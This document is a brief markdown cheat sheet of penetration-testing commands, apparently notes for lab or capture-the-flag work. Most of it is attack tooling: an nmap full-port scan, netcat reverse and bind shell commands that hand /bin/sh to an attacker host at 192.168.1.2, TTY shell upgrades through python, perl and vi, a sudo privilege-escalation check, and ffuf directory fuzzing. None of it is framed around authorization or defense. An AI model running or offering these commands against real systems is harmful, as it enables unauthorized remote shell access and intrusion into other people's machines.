# NMAP
~~~
nmap -T4 -p- -A <target ip>
~~~
# Python Webserver
~~~
python3 -m http.server <port>
~~~

# Netcat 
~~~
## Reverse Shell
### Attacker Listener
nc -nlvp 4444

### Target Connecting
nc 192.168.1.2 4444 -e /bin/sh

## Bind Shell
### Attacker Connecting
nc 192.168.1.2 4444

### Target Listener
nc -nvlp 4444 -e /bin/sh
~~~

# TTY Shell
~~~
## Using python
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'

## Echo
echo 'os.system('/bin/bash')'

## sh
/bin/sh -i

## bash
/bin/bash -i

## Perl
perl -e 'exec "/bin/sh";'

## From within VI
:!bash
~~~

# Privilege Escalation Check
~~~
sudo -l
~~~

# OpenVPN
~~~
sudo openvpn <file>.vpn
~~~
# ffuf
~~~
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<ip>/FUZZ
~~~



